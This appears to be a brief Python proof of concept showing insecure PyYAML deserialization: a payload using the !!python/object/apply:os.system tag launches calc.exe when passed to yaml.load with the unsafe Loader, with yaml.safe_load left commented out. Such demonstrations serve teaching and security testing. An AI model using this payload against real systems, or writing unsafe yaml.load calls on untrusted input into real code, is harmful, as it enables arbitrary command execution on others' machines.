import yaml 

payload = """
!!python/object/apply:os.system
- calc.exe
"""

result = yaml.load(payload, Loader=yaml.Loader)
#result = yaml.safe_load(payload)
print(result)
